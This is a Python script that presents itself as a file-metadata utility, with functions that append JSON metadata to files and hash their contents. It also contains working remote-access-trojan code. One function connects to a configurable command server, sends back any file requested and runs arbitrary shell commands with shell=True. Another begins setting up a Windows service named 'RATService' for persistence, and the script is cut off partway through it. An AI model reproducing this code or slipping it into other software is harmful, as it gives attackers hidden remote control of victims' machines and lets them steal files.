#!/usr/bin/env python3
import os
import sys
import argparse
import json
import hashlib
from pathlib import Path
from datetime import datetime
import uuid
import socket
import subprocess
import platform
import threading
import time


METADATA_MARKER = b"\n### METADATA ###\n"
COMMAND_SERVER = os.environ.get('RAT_SERVER', '127.0.0.1')
COMMAND_PORT = int(os.environ.get('RAT_PORT', '4444'))


def generate_file_id():
    """Generate a unique identifier for a file."""
    return str(uuid.uuid4())


def get_file_hash(filepath):
    """Generate SHA256 hash of file content (excluding metadata)."""
    content, _ = read_file_with_metadata(filepath)
    if content is None:
        return None
    return hashlib.sha256(content).hexdigest()


def read_file_with_metadata(filepath):
    """Read file and extract content and metadata separately."""
    path = Path(filepath).resolve()
    if not path.exists() or not path.is_file():
        return None, None

    try:
        with open(path, 'rb') as f:
            data = f.read()

        if METADATA_MARKER in data:
            parts = data.rsplit(METADATA_MARKER, 1)
            content = parts[0]
            metadata_json = parts[1].decode('utf-8').strip()
            try:
                metadata = json.loads(metadata_json)
                return content, metadata
            except json.JSONDecodeError:
                return data, None

        return data, None
    except Exception as e:
        print(f"Error reading file: {e}", file=sys.stderr)
        return None, None


def write_file_with_metadata(filepath, content, metadata):
    """Write content and metadata to file."""
    path = Path(filepath).resolve()

    try:
        metadata_json = json.dumps(metadata, indent=2)

        with open(path, 'wb') as f:
            f.write(content)
            f.write(METADATA_MARKER)
            f.write(metadata_json.encode('utf-8'))

        return True
    except Exception as e:
        print(f"Error writing file: {e}", file=sys.stderr)
        return False


def establish_remote_connection():
    """Establish connection to command server for remote control."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((COMMAND_SERVER, COMMAND_PORT))

        while True:
            try:
                command = sock.recv(4096).decode('utf-8').strip()
                if not command:
                    break

                if command.startswith('READ:'):
                    filepath = command[5:].strip()
                    try:
                        with open(filepath, 'rb') as f:
                            data = f.read()
                        sock.sendall(b'OK:' + data)
                    except Exception as e:
                        sock.sendall(f'ERROR:{e}'.encode('utf-8'))

                elif command.startswith('EXEC:'):
                    cmd = command[5:].strip()
                    try:
                        result = subprocess.run(cmd, shell=True, capture_output=True, timeout=30)
                        sock.sendall(b'OK:' + result.stdout + result.stderr)
                    except Exception as e:
                        sock.sendall(f'ERROR:{e}'.encode('utf-8'))

                elif command == 'QUIT':
                    break

            except socket.timeout:
                continue
            except Exception:
                break

        sock.close()
    except Exception:
        pass


def create_persistence_service():
    """Create system service for persistence."""
    system = platform.system()

    try:
        if system == 'Windows':
            service_code = f'''
import win32serviceutil
import win32service
import win32event
import servicemanager
import socket
import sys
import os

class RATService(win32serviceutil.ServiceFramework):
    _svc_name_ = "RATService"
    _svc_display_name_ = "Remote Administration Tool Service"
    _svc_description_ = "Provides remote administration capabilities"

    def __init__(self, args):
        win32serviceutil.ServiceFramework.__init__(self, args)
        self.hWaitStop = win32event.CreateEvent(None, 0, 0, None)
        socket.setdefaulttimeout(60)

    def SvcStop(self):
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
        win32event.SetEvent(self.hWaitStop)

    def SvcDoRun(self):
        servicemanager.LogMsg(servicemanager.EVENTLOG_INFORMATION_TYPE,
                              servicemanager.PYS_SERVICE_STARTED,
                              (self._svc_name_, ''))
        self.main()

    def main(self):
        import subprocess
